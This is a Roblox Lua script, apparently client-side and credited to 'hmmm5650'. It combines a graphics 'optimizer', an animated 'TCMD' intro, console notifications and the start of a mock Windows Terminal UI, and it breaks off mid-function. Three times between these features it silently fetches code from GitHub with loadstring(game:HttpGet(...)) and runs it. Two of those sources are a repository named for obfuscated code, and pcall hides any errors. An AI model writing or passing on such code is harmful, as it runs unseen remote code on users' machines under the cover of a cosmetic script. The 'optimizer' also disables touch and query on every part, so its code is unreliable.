local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")

-- Verify execution context
if not RunService:IsClient() and not RunService:IsServer() then
    warn("Script must run in either client or server context")
    return
end

-- Safe physics optimization (server-side only)
if RunService:IsServer() then
    pcall(function()
        settings().Physics.AllowSleep = true
        settings().Physics.ThrottleAdjustTime = 5
    end)
end

-- Core optimization function
local function applyOptimizations()
    -- Lighting optimizations (removed fog completely)
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.Outlines = false
        Lighting.Brightness = 2
        Lighting.FogEnd = 1000000000000000 -- Effectively disables fog
        Lighting.FogStart = 0
    end)

    -- Disable expensive effects safely
    for _, child in ipairs(Lighting:GetChildren()) do
        pcall(function()
            if child:IsA("PostEffect") then
                child.Enabled = false
            end
        end)
    end

    -- Terrain optimizations
    local terrain = Workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        pcall(function()
            terrain.Decoration = false
            terrain.WaterReflectance = 0
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
        end)
    end

    -- BasePart optimizations with safety checks
    local function optimizePart(part)
        pcall(function()
            if part:IsA("BasePart") then
                part.CastShadow = false
                part.Massless = true
                part.CanQuery = false
                part.CanTouch = false
                
                -- Preserve collision for character parts
                local humanoid = part:FindFirstAncestorOfClass("Model") and 
                               part:FindFirstAncestorOfClass("Model"):FindFirstChildOfClass("Humanoid")
                if not humanoid then
                end
            end
        end)
    end

    -- Optimize existing instances
    for _, instance in ipairs(Workspace:GetDescendants()) do
        if instance:IsA("BasePart") then
            optimizePart(instance)
        elseif instance:IsA("ParticleEmitter") or instance:IsA("Fire") or instance:IsA("Smoke") then
            pcall(function() instance.Enabled = false end)
        end
    end

    -- Optimize new instances
    Workspace.DescendantAdded:Connect(function(instance)
        if instance:IsA("BasePart") then
            optimizePart(instance)
        elseif instance:IsA("ParticleEmitter") or instance:IsA("Fire") or instance:IsA("Smoke") then
            pcall(function() instance.Enabled = false end)
        end
    end)
end

-- Safe character optimization
local function optimizeCharacter(character)
    pcall(function()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            humanoid.AutoRotate = true
            humanoid.AutoJumpEnabled = true
        end

        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                pcall(function()
                    part.CastShadow = false
                    part.Massless = true
                end)
            end
        end
    end)
end

-- Player connection handling
local function playerAdded(player)
    player.CharacterAdded:Connect(optimizeCharacter)
    if player.Character then
        optimizeCharacter(player.Character)
    end
end

-- Initialize for all players
for _, player in ipairs(Players:GetPlayers()) do
    pcall(function() playerAdded(player) end)
end
Players.PlayerAdded:Connect(playerAdded)

-- Dynamic performance adjustment
if RunService:IsClient() then
    local lastFPSUpdate = time()
    local currentFPS = 60

    RunService.RenderStepped:Connect(function()
        if time() - lastFPSUpdate >= 1 then
            currentFPS = math.floor(1 / RunService.RenderStepped:Wait())
            lastFPSUpdate = time()
            
            pcall(function()
                if currentFPS < 30 then
                    Lighting.QualityLevel = Enum.QualityLevel.Level01
                elseif currentFPS < 45 then
                    Lighting.QualityLevel = Enum.QualityLevel.Level05
                else
                    Lighting.QualityLevel = Enum.QualityLevel.Level10
                end
            end)
        end
    end)

    -- Window focus optimization
    UserInputService.WindowFocusReleased:Connect(function()
        pcall(function() Lighting.QualityLevel = Enum.QualityLevel.Level01 end)
    end)

    UserInputService.WindowFocused:Connect(function()
        pcall(function() Lighting.QualityLevel = Enum.QualityLevel.Level10 end)
    end)
end

-- Initial optimization
applyOptimizations()

print("CPU Optimization Active - Performance Enhanced")
task.wait()
-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local ContentProvider = game:GetService("ContentProvider")

-- Constants
local INTRO_TEXT = "TCMD"
local WATERMARK_TEXT = "Made By hmmm5650"
local INTRO_DURATION = 8 -- Duration of the entire intro animation in seconds
local PARTICLE_COUNT = 55 -- Increased particle count for richer background
local PARTICLE_COLORS = {
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 200, 100),
    Color3.fromRGB(50, 255, 50)
}

-- Preload assets to prevent lag
ContentProvider:PreloadAsync({
    "rbxassetid://11173905963", -- Example of a potential custom font
    "rbxassetid://7122228011"   -- Example particle texture
})

-- Create ScreenGui with improved settings
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CinematicIntro"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999 -- Ensure it's on top

-- Create layered background for depth effect
local background = Instance.new("Frame")
background.Name = "Background"
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
background.BackgroundTransparency = 1
background.ZIndex = 0
background.Parent = screenGui

-- Create gradient overlay for background
local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 20, 30)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 25))
})
bgGradient.Rotation = 90
bgGradient.Transparency = NumberSequence.new(0.7)
bgGradient.Parent = background

-- Create particle system with improved visuals
local particles = {}
for i = 1, PARTICLE_COUNT do
    local particle = Instance.new("ImageLabel") -- Using ImageLabel for potential texture
    particle.Name = "Particle_"..i
    particle.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8))
    particle.Position = UDim2.new(0, math.random(0, 1000), 0, math.random(0, 600))
    particle.BackgroundTransparency = 1
    particle.ImageColor3 = PARTICLE_COLORS[math.random(1, #PARTICLE_COLORS)]
    particle.ImageTransparency = 0.7
    particle.Image = "rbxassetid://7122228011" -- Optional particle texture
    particle.ZIndex = 1
    particle.Parent = background
    
    -- Store initial position for animation with varied properties
    particles[i] = {
        instance = particle,
        speed = math.random(15, 40),
        direction = Vector2.new(math.random() * 2 - 1, math.random() * 2 - 1).Unit,
        rotationSpeed = math.random(-5, 5),
        currentRotation = 0
    }
end

-- Create TextLabel for intro text with improved styling
local textLabel = Instance.new("TextLabel")
textLabel.Name = "Title"
textLabel.Text = INTRO_TEXT
textLabel.Size = UDim2.new(0, 0, 0, 0)
textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Font = Enum.Font.GothamBlack
textLabel.TextScaled = true
textLabel.TextStrokeTransparency = 0.8
textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
textLabel.ZIndex = 3
textLabel.TextTransparency = 1
textLabel.Parent = screenGui

-- Create advanced text effects
local textShadow = textLabel:Clone()
textShadow.Name = "TextShadow"
textShadow.TextColor3 = Color3.fromRGB(0, 100, 0)
textShadow.TextTransparency = 0.9
textShadow.Position = UDim2.new(0.5, 4, 0.5, 4) -- Offset for shadow
textShadow.ZIndex = 2
textShadow.Parent = screenGui

-- Create gradient underlay for text with animation potential
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 150)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 255))
})
gradient.Rotation = 0
gradient.Enabled = false
gradient.Parent = textLabel

-- Create TextLabel for watermark with improved styling
local watermarkLabel = Instance.new("TextLabel")
watermarkLabel.Name = "Watermark"
watermarkLabel.Text = WATERMARK_TEXT
watermarkLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
watermarkLabel.Position = UDim2.new(0.5, 0, 0.85, 0)
watermarkLabel.AnchorPoint = Vector2.new(0.5, 0.5)
watermarkLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
watermarkLabel.BackgroundTransparency = 1
watermarkLabel.Font = Enum.Font.GothamMedium
watermarkLabel.TextSize = 18
watermarkLabel.TextTransparency = 1
watermarkLabel.ZIndex = 3
watermarkLabel.Parent = screenGui

-- Create cinematic effects
local blurEffect = Instance.new("BlurEffect")
blurEffect.Name = "CinematicBlur"
blurEffect.Size = 24
blurEffect.Parent = Lighting

local colorCorrection = Instance.new("ColorCorrectionEffect")
colorCorrection.Name = "CinematicColor"
colorCorrection.TintColor = Color3.fromRGB(235, 214, 144)
colorCorrection.Brightness = -0.1
colorCorrection.Contrast = 0.1
colorCorrection.Saturation = -0.3
colorCorrection.Parent = Lighting

local dofEffect = Instance.new("DepthOfFieldEffect")
dofEffect.Name = "CinematicDOF"
dofEffect.FarIntensity = 0.1
dofEffect.FocusDistance = 0.05
dofEffect.InFocusRadius = 5
dofEffect.NearIntensity = 0.75
dofEffect.Parent = Lighting

-- Improved tween timing with more dynamic animation
local fadeInTweenInfo = TweenInfo.new(
    INTRO_DURATION * 0.35,
    Enum.EasingStyle.Quint,
    Enum.EasingDirection.Out,
    0,
    false,
    0
)

local holdTweenInfo = TweenInfo.new(
    INTRO_DURATION * 0.3,
    Enum.EasingStyle.Sine,
    Enum.EasingDirection.InOut,
    0,
    false,
    0
)

local fadeOutTweenInfo = TweenInfo.new(
    INTRO_DURATION * 0.35,
    Enum.EasingStyle.Back,
    Enum.EasingDirection.In,
    0,
    false,
    0
)

-- Additional tweens for enhanced effects
local bgFadeInTweenInfo = TweenInfo.new(
    INTRO_DURATION * 0.25,
    Enum.EasingStyle.Quad,
    Enum.EasingDirection.Out,
    0,
    false,
    0
)

local gradientRotateTweenInfo = TweenInfo.new(
    INTRO_DURATION * 0.6,
    Enum.EasingStyle.Linear,
    Enum.EasingDirection.InOut,
    0,
    false,
    0
)

-- Tween goals with more dynamic animations
local fadeInGoals = {
    TextTransparency = 0, 
    Size = UDim2.new(0.7, 0, 0.7, 0),
    TextStrokeTransparency = 0.5
}

local shadowFadeInGoals = {
    TextTransparency = 0.7,
    Size = UDim2.new(0.7, 0, 0.7, 0)
}

local holdGoals = {
    Rotation = 5,
    TextColor3 = Color3.fromRGB(200, 240, 255)
}

local fadeOutGoals = {
    TextTransparency = 1, 
    Size = UDim2.new(1.2, 0, 1.2, 0),
    Rotation = -5,
    TextStrokeTransparency = 1
}

local blurOutGoals = {Size = 0}
local watermarkFadeInGoals = {
    Position = UDim2.new(0.5, 0, 0.85, 0), 
    TextTransparency = 0.2,
    TextColor3 = Color3.fromRGB(0, 255, 150)
}

local watermarkFadeOutGoals = {
    Position = UDim2.new(0.5, 0, 0.9, 0), 
    TextTransparency = 1
}

local bgFadeInGoals = {BackgroundTransparency = 0.85}
local bgFadeOutGoals = {BackgroundTransparency = 1}
local gradientEnableGoals = {Enabled = true}
local gradientDisableGoals = {Enabled = false}
local gradientRotateGoals = {Rotation = 360}

-- Create tweens
local fadeInTween = TweenService:Create(textLabel, fadeInTweenInfo, fadeInGoals)
local shadowFadeInTween = TweenService:Create(textShadow, fadeInTweenInfo, shadowFadeInGoals)
local holdTween = TweenService:Create(textLabel, holdTweenInfo, holdGoals)
local fadeOutTween = TweenService:Create(textLabel, fadeOutTweenInfo, fadeOutGoals)
local shadowFadeOutTween = TweenService:Create(textShadow, fadeOutTweenInfo, fadeOutGoals)
local blurOutTween = TweenService:Create(blurEffect, fadeOutTweenInfo, blurOutGoals)
local watermarkFadeInTween = TweenService:Create(watermarkLabel, fadeInTweenInfo, watermarkFadeInGoals)
local watermarkFadeOutTween = TweenService:Create(watermarkLabel, fadeOutTweenInfo, watermarkFadeOutGoals)
local bgFadeInTween = TweenService:Create(background, bgFadeInTweenInfo, bgFadeInGoals)
local bgFadeOutTween = TweenService:Create(background, fadeOutTweenInfo, bgFadeOutGoals)
local gradientEnableTween = TweenService:Create(gradient, fadeInTweenInfo, gradientEnableGoals)
local gradientDisableTween = TweenService:Create(gradient, fadeOutTweenInfo, gradientDisableGoals)
local gradientRotateTween = TweenService:Create(gradient, gradientRotateTweenInfo, gradientRotateGoals)

-- Enhanced particle animation with rotation
local particleConnection
local function animateParticles(dt)
    for _, particle in ipairs(particles) do
        local currentPos = particle.instance.Position
        local moveAmount = particle.speed * dt
        local newX = (currentPos.X.Offset + particle.direction.X * moveAmount) % 1000
        local newY = (currentPos.Y.Offset + particle.direction.Y * moveAmount) % 600
        
        particle.currentRotation = (particle.currentRotation + particle.rotationSpeed * dt) % 360
        particle.instance.Rotation = particle.currentRotation
        particle.instance.Position = UDim2.new(0, newX, 0, newY)
    end
end

-- Function to play intro animation with improved sequencing
local function playIntroAnimation()
    -- Parent the ScreenGui to the player's PlayerGui
    local player = Players.LocalPlayer
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    -- Start particle animation
    particleConnection = RunService.Heartbeat:Connect(animateParticles)
    
    -- Initial state
    background.BackgroundTransparency = 1
    
    -- Play background fade in
    bgFadeInTween:Play()
    
    -- Play fade-in animations
    fadeInTween:Play()
    shadowFadeInTween:Play()
    gradientEnableTween:Play()
    gradientRotateTween:Play()
    
    -- Delayed watermark appearance
    task.delay(INTRO_DURATION * 0.25, function()
        watermarkFadeInTween:Play()
    end)
    
    -- Wait for fade in to complete
    fadeInTween.Completed:Wait()
    
    -- Play hold animation
    holdTween:Play()
    holdTween.Completed:Wait()
    
    -- Play fade-out animations
    fadeOutTween:Play()
    shadowFadeOutTween:Play()
    watermarkFadeOutTween:Play()
    blurOutTween:Play()
    bgFadeOutTween:Play()
    gradientDisableTween:Play()
    
    -- Wait for animations to complete
    fadeOutTween.Completed:Wait()
    
    -- Clean up
    particleConnection:Disconnect()
    screenGui:Destroy()
    blurEffect:Destroy()
    colorCorrection:Destroy()
    dofEffect:Destroy()
end

-- Play the intro animation with error handling
local success, err = pcall(playIntroAnimation)
if not success then
    warn("Intro animation failed: " .. err)
    -- Clean up in case of failure
    if screenGui then screenGui:Destroy() end
    if blurEffect then blurEffect:Destroy() end
    if colorCorrection then colorCorrection:Destroy() end
    if dofEffect then dofEffect:Destroy() end
end
task.wait()
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit", true))()
end)
-- PrintLoaderModule.lua
-- A loading GUI that uses the console as the loading GUI for other scripts
print("✅ - Working: It's Good and working) ☑️ - loads external: Loads scripts inside scripts) 🔄 - Debug: checks if working and debugs it ) ❌ - failed: doesn't work or something went wrong) ⚠️ - warn: warns the player")
print("\n")

pcall(function()
local DEBUG = true
local DEBUG_CHANCE = 0.099

local SoundId = "rbxassetid://5515669992" -- Replace with your preferred sound ID
local volume = 2 -- Adjust the volume (0 to 10)
local notifications = {} -- Stores active notifications

local function debugPrint(message)
    if DEBUG and math.random() < DEBUG_CHANCE then
        print(message)
    end
end

debugPrint("🔄 [Debug] Initializing playNotificationSound function")
local function playNotificationSound()
    debugPrint("🔄 [Debug] Creating sound instance for notification")
    local sound = Instance.new("Sound")
    sound.SoundId = SoundId
    sound.Volume = volume
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    sound.Ended:Connect(function()
        debugPrint("🔄 [Debug] Notification sound ended, destroying instance")
        sound:Destroy()
    end)
end

debugPrint("🔄 [Debug] Initializing updateNotificationPositions function")
local function updateNotificationPositions()
    debugPrint("🔄 [Debug] Updating notification positions")
    for i, frame in ipairs(notifications) do
        local targetPos = UDim2.new(0, 20, 0, 20 + ((i - 1) * 70)) -- Adjusts stacking
        debugPrint(string.format("🔄 [Debug] Moving notification to position %d", i))
        game:GetService("TweenService"):Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPos}):Play()
    end
end

debugPrint("🔄 [Debug] Initializing createNotification function")
local function createNotification(message, duration, imageAssetId)
    debugPrint("🔄 [Debug] Playing notification sound")
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    playNotificationSound()

    local screenGui = playerGui:FindFirstChild("NotificationGui") or Instance.new("ScreenGui")
    screenGui.Name = "NotificationGui"
    screenGui.Parent = playerGui

    local notificationFrame = Instance.new("Frame")
    notificationFrame.Size = UDim2.new(0, 220, 0, 60)
    notificationFrame.Position = UDim2.new(0, -200, 0, 20) -- Start off-screen
    notificationFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    notificationFrame.BackgroundTransparency = 0.2
    notificationFrame.BorderSizePixel = 1
    notificationFrame.BorderColor3 = Color3.fromRGB(128, 128, 128)
    notificationFrame.ClipsDescendants = true
    notificationFrame.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 19)
    uiCorner.Parent = notificationFrame

    local notificationText = Instance.new("TextLabel")
    notificationText.Size = UDim2.new(1, 0, 1, 0)
    notificationText.Text = message
    notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
    notificationText.TextSize = 20
    notificationText.TextWrapped = true
    notificationText.BackgroundTransparency = 1
    notificationText.Font = Enum.Font.GothamBold
    notificationText.Parent = notificationFrame

    local durationBar = Instance.new("Frame")
    durationBar.Size = UDim2.new(1, 0, 0.1, 0)
    durationBar.Position = UDim2.new(0, 9, 0.8, 0)
    durationBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    durationBar.BorderSizePixel = 0
    durationBar.Parent = notificationFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 5)
    barCorner.Parent = durationBar

    local imageLabel = Instance.new("ImageLabel")
    imageLabel.Size = UDim2.new(0, 20, 0, 20)
    imageLabel.Position = UDim2.new(1, -213, 0, 5)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = imageAssetId
    imageLabel.Parent = notificationFrame

    table.insert(notifications, notificationFrame)
    updateNotificationPositions()

    local tweenService = game:GetService("TweenService")
    local tweenIn = tweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 0, 20 + ((#notifications - 1) * 70))})
    tweenIn:Play()

    local durationTween = tweenService:Create(durationBar, TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0.1, 0)})
    durationTween:Play()

    local function closeNotification()
        debugPrint("🔄 [Debug] Closing notification")
        local tweenOut = tweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0, -200, 0, notificationFrame.Position.Y.Offset)})
        tweenOut:Play()
        tweenOut.Completed:Wait()

        for i, frame in ipairs(notifications) do
            if frame == notificationFrame then
                table.remove(notifications, i)
                break
            end
        end

        updateNotificationPositions()
        notificationFrame:Destroy()
    end

    notificationFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            closeNotification()
        end
    end)

    task.spawn(function()
        task.wait(duration)
        closeNotification()
    end)
end

debugPrint("🔄 [Debug] Initializing playSound function")
local function playSound(soundId)
    debugPrint("🔄 [Debug] Playing sound with SoundId: "..soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Parent = workspace
    sound:Play()
    sound.Ended:Connect(function()
        debugPrint("🔄 [Debug] Sound ended, destroying instance")
        sound:Destroy()
    end)
end

debugPrint("🔄 [Debug] Initializing checkForError function")
local function checkForError()
    debugPrint("🔄 [Debug] Checking for errors")
    local success, errorMessage = pcall(function()
        -- Place code that could potentially error here
    end)

    if success then
        print("✅ [Status] No Error Detected.")
    else
        print("⚠️ [Warning] Error Detected: " .. errorMessage)
        createNotification("⚠️ Error Detected: " .. errorMessage, 5, "rbxassetid://1234567890") -- Replace with an appropriate image asset ID
    end
end

-- Example Usage
debugPrint("🔄 [Debug] Running example usage")
checkForError()
createNotification("Type In <cmds>", 5, "rbxassetid://132036502772790")
wait()
createNotification("TerminalCmd :D", 5, "rbxassetid://132036502772790")
task.wait()

print(" ၊၊||၊|။||||။‌‌‌‌‌၊|• TerminalCmd •၊၊||၊|။||||။‌‌‌‌‌၊|")
task.wait()

local UIS = game:GetService("UserInputService")

debugPrint("🔄 [Debug] Initializing openConsole function")
local function openConsole()
    debugPrint("🔄 [Debug] Opening DevConsole")
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end

UIS.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.P then
        openConsole()
    end
end)

 -- the loadstring is full of resources for it to run the script
pcall(function()
    debugPrint("🔄 [Debug] Running pcall block")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PrintLoadRes/refs/heads/main/PrintLoadRes", true))()
    playSound("rbxassetid://")
    task.wait()
    playSound("rbxassetid://")
    task.wait()
    playSound("rbxassetid://")
    task.wait(0.50)
end)

print("-------------------------------------------------")
print("\n")

local userInputService = game:GetService("UserInputService")

if userInputService.TouchEnabled then
    print("📱 [Scanning] PlayerUserMobile")
else
    print("🖥️ [Scanning] PlayerUserPersonalComputer")
end
task.wait()
print("madebyhmmm5650")
task.wait()
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit", true))()
end)
task.wait()

debugPrint("🔄 [Debug] Initializing closeConsole function")
local function closeConsole()
    debugPrint("🔄 [Debug] Closing DevConsole")
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", false)
end

closeConsole()

UIS.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.O then
        closeConsole()
    end
end)

local success, err = pcall(function()
    pcall(function()
    print("Script started")

    -- Services
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    local SoundService = game:GetService("SoundService")

    -- Player
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    -- Function to destroy the UI
    local function destroyUI()
        local existingUI = playerGui:FindFirstChild("TerminalUI")
        if existingUI then
            existingUI:Destroy()
        end
    end

    -- Function to create the UI
    local function createUI()
        -- Clear existing UI if it exists
        destroyUI()

        -- Create ScreenGui
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "TerminalUI"
        screenGui.Parent = playerGui
        print("ScreenGui created and parented")

        -- Create a Sound instance
        local typingSound = Instance.new("Sound")
        typingSound.SoundId = "rbxassetid://9120299810" -- Replace with your sound ID
        typingSound.Volume = 0.5 -- Adjust volume as needed
        typingSound.Parent = screenGui

        -- Create Main Frame
        local mainFrame = Instance.new("Frame")
        mainFrame.Name = "MainFrame"
        mainFrame.Size = UDim2.new(0.4, 0, 0.4, 0) -- Smaller size
        mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0) -- Centered
        mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        mainFrame.Transparency = 0.1
        mainFrame.BorderSizePixel = 0
        mainFrame.Active = true
        mainFrame.Parent = screenGui

        -- Add Squircle Corner to Main Frame
        local mainFrameCorner = Instance.new("UICorner")
        mainFrameCorner.CornerRadius = UDim.new(0.1, 0) -- Adjust for squircle effect
        mainFrameCorner.Parent = mainFrame

        -- Add Green Pulsing Outline to Main Frame
        local mainFrameStroke = Instance.new("UIStroke")
        mainFrameStroke.Color = Color3.fromRGB(27, 42, 53)
        mainFrameStroke.Thickness = 3
        mainFrameStroke.Transparency = 0.3
        mainFrameStroke.Parent = mainFrame

        -- Animate the Outline
        local pulseTween = TweenService:Create(
            mainFrameStroke,
            TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            { Transparency = 0.8 }
        )
        pulseTween:Play()

        print("MainFrame created and parented")

        -- Create Output Scrolling Frame
        local outputFrame = Instance.new("ScrollingFrame")
        outputFrame.Name = "OutputFrame"
        outputFrame.Size = UDim2.new(1, -10, 0.85, -10) -- Adjusted height to make room for the input box
        outputFrame.Position = UDim2.new(0, 5, 0, 5)
        outputFrame.BackgroundTransparency = 1
        outputFrame.ScrollBarThickness = 8
        outputFrame.Parent = mainFrame
        print("OutputFrame created and parented")

        -- Create Output TextLabel
        local outputText = Instance.new("TextLabel")
        outputText.Name = "OutputText"
        outputText.Size = UDim2.new(1, 0, 1, 0)
        outputText.Position = UDim2.new(0, 0, 0, 0)
        outputText.BackgroundTransparency = 1
        outputText.TextColor3 = Color3.fromRGB(204, 204, 204)
        outputText.TextXAlignment = Enum.TextXAlignment.Left
        outputText.TextYAlignment = Enum.TextYAlignment.Top
        outputText.TextWrapped = true
        outputText.Text = "Windows Terminal [Version 10.0.22000.194]\n(c) Microsoft Corporation. All rights reserved.\n\n"
        outputText.Font = Enum.Font.Code
        outputText.TextSize = 12
        outputText.Parent = outputFrame
        print("OutputText created and parented")

        -- Create Input Box Frame (For Blue Outline)
        local inputBoxFrame = Instance.new("Frame")
        inputBoxFrame.Name = "InputBoxFrame"
        inputBoxFrame.Size = UDim2.new(0.5, 0, 0.09, 0)
        inputBoxFrame.Position = UDim2.new(0.5, -inputBoxFrame.Size.X.Offset / 2, 1.1, -inputBoxFrame.Size.Y.Offset / 2)
        inputBoxFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        inputBoxFrame.Parent = mainFrame

        -- Add Circular Corner to Input Box Frame
        local inputBoxFrameCorner = Instance.new("UICorner")
        inputBoxFrameCorner.CornerRadius = UDim.new(1, 0) -- Fully circular
        inputBoxFrameCorner.Parent = inputBoxFrame

        -- Add Blue Pulsing Outline to Input Box Frame
        local inputBoxFrameStroke = Instance.new("UIStroke")
        inputBoxFrameStroke.Color = Color3.fromRGB(27, 42, 53)
        inputBoxFrameStroke.Thickness = 2
        inputBoxFrameStroke.Transparency = 0.3
        inputBoxFrameStroke.Parent = inputBoxFrame

        -- Animate the Blue Outline
        local inputBoxPulseTween = TweenService:Create(
            inputBoxFrameStroke,
            TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            { Transparency = 0.8 }
        )
        inputBoxPulseTween:Play()

        -- Create Input TextBox inside the Frame
        local inputBox = Instance.new("TextBox")
        inputBox.Name = "InputBox"
        inputBox.Size = UDim2.new(1, -5, 1, -5) -- Fit inside the frame with a margin
        inputBox.Position = UDim2.new(0, 2, 0, 2)
        inputBox.BackgroundTransparency = 1 -- Make it transparent so only frame is visible
        inputBox.TextColor3 = Color3.fromRGB(200, 200, 200)
        inputBox.PlaceholderText = "Type a command..."
        inputBox.Font = Enum.Font.Code
        inputBox.TextSize = 12
        inputBox.ClearTextOnFocus = false
        inputBox.Parent = inputBoxFrame

        -- Play sound when typing in the input box
        inputBox:GetPropertyChangedSignal("Text"):Connect(function()
            if inputBox:IsFocused() and inputBox.Text ~= "" then
                typingSound:Play()
            end
        end)

        -- Add Circular Corner to Input Box
        local inputBoxCorner = Instance.new("UICorner")
        inputBoxCorner.CornerRadius = UDim.new(1, 0) -- Fully circular
        inputBoxCorner.Parent = inputBox

        print("InputBox created and parented")

-- Create Minimize Button
local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Text = "_"
minimizeButton.Size = UDim2.new(0, 20, 0, 20)
minimizeButton.Position = UDim2.new(1, -25, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
minimizeButton.BackgroundTransparency = 0.3
minimizeButton.TextColor3 = Color3.fromRGB(155, 155, 155)
minimizeButton.Parent = mainFrame

-- Make Minimize Button Circular
local minimizeButtonCorner = Instance.new("UICorner")
minimizeButtonCorner.CornerRadius = UDim.new(1, 0) -- Fully circular
minimizeButtonCorner.Parent = minimizeButton

-- Create Collapsed Label
local collapsedLabel = Instance.new("TextLabel")
collapsedLabel.Name = "CollapsedLabel"
collapsedLabel.Text = "TCmd (v0.8)"
collapsedLabel.Size = UDim2.new(1, 0, 1, 0)
collapsedLabel.Position = UDim2.new(0, -20, -0.02, 0)
collapsedLabel.BackgroundTransparency = 1
collapsedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
collapsedLabel.TextXAlignment = Enum.TextXAlignment.Center
collapsedLabel.TextYAlignment = Enum.TextYAlignment.Center
collapsedLabel.Font = Enum.Font.Code
collapsedLabel.TextSize = 19
collapsedLabel.Visible = false
collapsedLabel.Parent = mainFrame

-- Button hover animations
minimizeButton.MouseEnter:Connect(function()
    local tween = game:GetService("TweenService"):Create(
        minimizeButton,
        TweenInfo.new(0.2),
        {BackgroundTransparency = 0, TextColor3 = Color3.fromRGB(255, 255, 255)}
    )
    tween:Play()
end)

minimizeButton.MouseLeave:Connect(function()
    local tween = game:GetService("TweenService"):Create(
        minimizeButton,
        TweenInfo.new(0.2),
        {BackgroundTransparency = 0.3, TextColor3 = Color3.fromRGB(155, 155, 155)}
    )
    tween:Play()
end)

-- Variable to track minimized state
local isMinimized = false

-- Function to handle minimize button click with animations
minimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    
    local tweenService = game:GetService("TweenService")
    
    if isMinimized then
        -- Animate to minimized state
        local frameTween = tweenService:Create(
            mainFrame,
            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(0.2, 0, 0.1, 0)}
        )
        frameTween:Play()
        
        -- Fade out elements
        outputFrame.Visible = false
        inputBox.Visible = false
        inputBoxFrame.Visible = false
        
        -- Fade in collapsed label
        collapsedLabel.Visible = true
        collapsedLabel.TextTransparency = 1
        local labelTween = tweenService:Create(
            collapsedLabel,
            TweenInfo.new(0.3),
            {TextTransparency = 0}
        )
        labelTween:Play()
        
